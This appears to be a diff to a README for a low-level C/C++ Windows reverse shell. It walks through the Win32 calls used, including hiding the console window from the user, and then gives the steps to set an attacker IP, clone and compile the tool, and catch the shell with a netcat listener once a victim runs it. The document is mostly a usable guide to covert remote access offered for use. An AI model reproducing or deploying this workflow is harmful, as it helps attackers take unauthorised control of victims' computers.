@@ -1,12 +1,12 @@
 ## About this simple low level reverse shell
-#### introduction
+### introduction
 the main thing in exploit developement, malware analyse or any other topic when you are writing an exploit is how to deal with remote servers or machines and receive/ send data, so that you have to be familiar with the SOCKETs.
 
 socket is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network
 
 recognize that we talk about the low level language like c/c++. so first of all you have to install all prerequired stuff, an IDE, a compiler and a debugger which you can find them [here](https://code.visualstudio.com/docs/languages/cpp#_install-a-compiler)
 
-#### The functions I've used
+### The functions I've used
 1. [ShowWindow](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjh_t6mjP35AhXFglwKHcEcBgwQFnoECAQQAw&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fwinuser%2Fnf-winuser-showwindow&usg=AOvVaw0m88U6DTLNGTpAJUXh7Wlp)
 ```c
 ShowWindow( GetConsoleWindow(), SW_HIDE ); // hide the console of the current process from the user interface and run it in the background
@@ -34,4 +34,32 @@ WaitForSingleObject(pi.hProcess, INFINITE); \\ wait the process until it ends an
 7. [CloseHandle](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwib3Pahjf35AhWbi1wKHRA2AqMQFnoECAkQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fhandleapi%2Fnf-handleapi-closehandle&usg=AOvVaw0WzqOSJjwQS5kHDz5cTv71)
 ```c
 CloseHandle(pi.hProcess);
+```
+
+### edit attacker ip address
+```
+ char ip_addr[] = "127.0.0.1" // put your ip;
+```
+
+### compile the reverse shell
+```
+git clone https://github.com/hamza07-w/c-reverse-shell.git
+cd c-reverse-shell
+g++.exe -g rev-shell.cpp -o rev-shell.exe -lws2_32
+```
+
+the flag ```-lws2_32``` reffers to ```Ws2_32.lib``` winsocket ```dll```
+
+### reverse shell handler
+the best choice of all time it's our beautifull tool ```netcat ```
+so you just write 
+```
+nc -nlvp 9999
+```
+and press enter, by the click of the victim on the reverse shell application you will get the shell
+```
+C:\Users\m3z0diac\Desktop\host\c-reverse-shell>whoami
+desktop-arfg\m3z0diac
+
+C:\Users\m3z0diac\Desktop\host\c-reverse-shell>
 ```
